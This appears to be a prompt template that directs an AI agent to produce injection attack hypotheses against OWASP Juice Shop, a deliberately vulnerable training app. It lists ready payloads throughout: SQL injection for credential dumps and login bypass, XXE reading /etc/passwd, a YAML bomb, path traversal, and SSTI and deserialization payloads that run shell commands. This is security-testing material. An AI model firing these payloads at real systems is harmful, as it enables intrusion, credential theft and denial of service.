# Phase 1a — Injection Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **injection attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Cover **all injection classes**: SQL injection, NoSQL injection, XXE, YAML injection, server-side template injection (SSTI), path traversal, null byte injection, and insecure deserialization vectors.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Do NOT guess — cite specific endpoints, parameters, and evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Review all endpoints** from the recon report and identify those that accept user-controlled input which could reach a database query, OS command, template engine, file-system operation, or serialization handler.
2. **Cross-reference sinks with source code evidence** — the recon report's Identified Sinks section now includes source file and line number. For each sink:
   - Verify the input flow: which `req.query` / `req.body` / `req.params` field enters the sink?
   - Is there any sanitization between the entry point and the sink?
   - What is the exact SQL query shape (for crafting precise payloads)?
3. **Cross-reference with known CVEs** — if a CVE describes SQL injection, NoSQL injection, XXE, SSTI, or deserialization in a specific Juice Shop component/version, create a targeted hypothesis for it.
4. **Prioritise by exploitability:**
   - Endpoints with direct string concatenation into SQL (highest priority — source code confirmed)
   - Endpoints using ORM methods that may have raw query fallbacks (source code shows `raw: true`)
   - Endpoints accepting XML/YAML file uploads (XXE/YAML bomb vectors)
   - Endpoints using template engines with user-controlled input (SSTI)
   - Endpoints using `node-serialize` or `vm2` for user input (deserialization/sandbox escape)
   - Endpoints with indirect injection vectors (e.g., JSON body fields parsed into queries)
   - File-serving endpoints with path parameters (path traversal / null byte)
5. **Consider Juice Shop specifics:**
   - Sequelize ORM with known raw query patterns
   - SQLite backend (adjust payloads for SQLite syntax)
   - The search endpoint (`/rest/products/search?q=`) is a classic injection target
   - Login endpoint may be vulnerable to authentication bypass via SQL injection
   - `/rest/products/reviews` uses MongoDB-style query operators — NoSQL injection target
   - `/file-upload` accepts XML and YAML files — XXE and YAML bomb target
   - `/ftp/:file` serves static files with insufficient path validation — path traversal + null byte target
   - `/b2b/v2/orders` processes orders through a Pug/Jade template — SSTI target
   - Certain endpoints deserialize user-supplied objects using `node-serialize` — RCE target

## CRITICAL: Source-Code-Derived Query Shapes

Use the EXACT query shapes from the recon report's sinks section to craft precise payloads. The two most important queries are:

### Search endpoint (routes/search.ts)
```sql
SELECT * FROM Products WHERE ((name LIKE '%<CRITERIA>%' OR description LIKE '%<CRITERIA>%') AND deletedAt IS NULL) ORDER BY name
```
- Your input replaces `<CRITERIA>` and is placed between `'%` and `%'`
- To break out: close the `%'` first, then the double-parentheses `))`
- The Products table has **9 columns**: id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
- UNION payloads MUST have exactly 9 columns to match

### Login endpoint (routes/login.ts)
```sql
SELECT * FROM Users WHERE email = '<EMAIL>' AND password = '<HASHED_PASSWORD>' AND deletedAt IS NULL
```
- Email is injected directly (no hashing applied)
- Password is hashed BEFORE concatenation, so inject ONLY via the email field
- To bypass auth: close the `'` after email, then comment out the rest with `--`

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

### Classic SQL Injection
1. Boolean-based SQL injection on `/rest/products/search?q=` using `')) OR 1=1--`
2. UNION-based SQL injection on `/rest/products/search?q=` for schema extraction (9 columns)
3. UNION-based SQL injection on `/rest/products/search?q=` for user credential extraction
4. Authentication bypass on `/rest/user/login` via email field injection

### Advanced SQL Injection
5. Christmas Special SQLi — `qwert')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--` on `/rest/products/search?q=` to find hidden/deleted products (e.g. the "Christmas Super-Surprise-Box" only visible via deletedAt recovery)
6. Ephemeral Accountant — SQLi to INSERT a temporary user with `role='accounting'` via `/rest/products/search?q=` using stacked queries or UNION-based INSERT: `qwert'); INSERT INTO Users (email,password,role) VALUES ('accountant@juice-sh.op','anything','accounting')--`, then login as that user and delete it
7. User Credentials extraction — `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--` on `/rest/products/search?q=` to extract all user emails, MD5 password hashes, and roles

### NoSQL Injection
8. NoSQL operator injection on `PATCH /rest/products/reviews` using `{"id":{"$ne":-1}}` to modify all product reviews at once (bypassing per-review authorization)
9. NoSQL exfiltration — `GET /rest/products/reviews` or `PATCH /rest/products/reviews` with `{"$where":"this.author=='admin@juice-sh.op'"}` or `{"author":{"$regex":".*"}}` to extract review data from other users
10. NoSQL DoS — inject deeply nested or large `$regex` patterns like `{"id":{"$regex":"a]]{10000}"}}` on review endpoints to cause ReDoS or excessive processing

### XXE & File Injection
11. XXE file disclosure via XML upload to `POST /file-upload` with payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment>&xxe;</comment>` — upload as `.xml` file to extract server-side files
12. YAML injection DoS via YAML bomb upload to `POST /file-upload` — upload a YAML file containing `a: &a ["lol","lol","lol"] b: &b [*a,*a,*a] c: &c [*b,*b,*b] ...` (billion laughs) to trigger resource exhaustion

### Path Traversal & Null Byte Injection
13. Poison Null Bytes — `GET /ftp/package.json.bak%2500.md` or `GET /ftp/package.json.bak%00.md` using `%00` in file paths on `/ftp/` to bypass extension allow-list filters and download files that should be blocked (e.g. `.bak`, `.sh` files)
14. Path traversal on `GET /ftp/:file` using `../` or `....//` or encoded variants (`%2e%2e%2f`) to escape the FTP directory and read arbitrary server files like `../../etc/passwd` or `../../server.ts`

### Server-Side Template Injection (SSTI)
15. SSTI on `POST /b2b/v2/orders` — the B2B order XML/JSON body is rendered through a Pug/Jade template engine. Inject `#{7*7}` or `#{root.process.mainModule.require('child_process').execSync('id')}` in the order field to achieve template injection and potential RCE

### Insecure Deserialization
16. Blocked RCE DoS via insecure deserialization — send a crafted serialized Node.js object (e.g. `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('sleep 10')}()"}`) to an endpoint accepting serialized data to trigger denial of service
17. Successful RCE DoS via VM sandbox escape — use `vm2` sandbox escape payloads like `this.constructor.constructor('return process')().exit()` on endpoints that evaluate user input in a sandboxed VM context

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name>
**Injection Type:** <boolean / UNION / auth bypass / blind / error-based>
**Payload:** <specific injection payload — must account for the exact query shape>
**URL-Encoded Payload:** <the payload with special chars URL-encoded for direct use in curl>
**Expected Result:** <what a successful injection would produce — be specific about response differences>
**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md, including source file and line>
**Query Shape:** <the exact SQL query from source code where this payload will be injected>
```

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 3 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q
**Payload:** ' OR 1=1--
**Expected Result:** Returns all products instead of filtered subset (expect 30+ items vs 0)
**Evidence from recon:** Identified as SQL injection sink in recon_report — parameter concatenated into Sequelize raw query

### Hypothesis 2
**Endpoint:** POST /rest/user/login
**Parameter:** email (JSON body)
**Payload:** ' OR 1=1--
**Expected Result:** Authentication bypass — returns valid JWT without correct credentials
**Evidence from recon:** Login endpoint identified; Sequelize raw query pattern for auth

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop (SQLite + Sequelize)

- Use SQLite-compatible syntax: `'`, `--`, `/**/`, `UNION SELECT`
- **Search endpoint payloads** (must close `%'` and `))` before injecting):
  - Boolean: `qwert')) OR 1=1--` (NOT `' OR 1=1--` — that fails because it doesn't close the parentheses)
  - UNION schema: `qwert')) UNION SELECT sql,name,'3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--`
  - UNION users: `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--`
  - Christmas Special (deleted products): `qwert')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--`
  - Ephemeral Accountant (stacked query attempt): `qwert'); INSERT INTO Users (email,password,role) VALUES ('accountant@juice-sh.op','anything','accounting')--`
- **Login endpoint payloads** (inject via email field only):
  - Auth bypass: `' OR 1=1--` in the email field, any password
  - Targeted admin bypass: `admin@juice-sh.op'--` in the email field
- For JSON body injection (login): `{"email": "' OR 1=1--", "password": "x"}`
- For NoSQL-style: try `{"email": {"$gt": ""}, "password": {"$gt": ""}}` (if MongoDB layer exists)

### NoSQL Injection Payloads (MongoDB-style operators on REST endpoints)
- **Review modification:** `PATCH /rest/products/reviews` with `Content-Type: application/json` and body `{"id":{"$ne":-1}, "message":"pwned"}`
- **Review exfiltration:** `PATCH /rest/products/reviews` with `{"$where":"this.author=='admin@juice-sh.op'"}`
- **ReDoS:** `PATCH /rest/products/reviews` with `{"id":{"$regex":"a{10000}"}}`

### XXE Payloads (XML file upload)
- Craft a file `malicious.xml` containing:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <comment>&xxe;</comment>
  ```
- Upload via `POST /file-upload` with `Content-Type: multipart/form-data`

### YAML Bomb Payloads (YAML file upload)
- Craft a file `bomb.yaml` containing:
  ```yaml
  a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
  ```
- Upload via `POST /file-upload` with `Content-Type: multipart/form-data`

### Poison Null Byte Payloads (FTP directory)
- `GET /ftp/package.json.bak%2500.md` — null byte truncates the `.md` extension check, allowing download of `.bak` file
- `GET /ftp/package.json.bak%00.md` — alternative null byte encoding
- `GET /ftp/eastere.gg%2500.md` — access Easter egg file

### Path Traversal Payloads (FTP directory)
- `GET /ftp/....//....//etc/passwd` — double-dot-double-slash to bypass path filters
- `GET /ftp/%2e%2e%2f%2e%2e%2fetc/passwd` — URL-encoded traversal
- `GET /ftp/..%5c..%5cetc/passwd` — backslash encoding variant

### SSTI Payloads (B2B order endpoint)
- `POST /b2b/v2/orders` with body containing template expression in an order field:
  - Detection: `#{7*7}` → expect `49` in response
  - File read: `#{root.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}`
  - RCE: `#{root.process.mainModule.require('child_process').execSync('id').toString()}`

### Insecure Deserialization Payloads
- Send crafted `node-serialize` payload: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('sleep 10')}()"}`
- Target endpoints accepting serialized objects in cookies or request bodies
- VM sandbox escape: `res.constructor.constructor('return this')().process.exit()` or `this.constructor.constructor('return process')().exit()`

Save the output as `hypotheses_injection.md` using the `save_deliverable` tool.
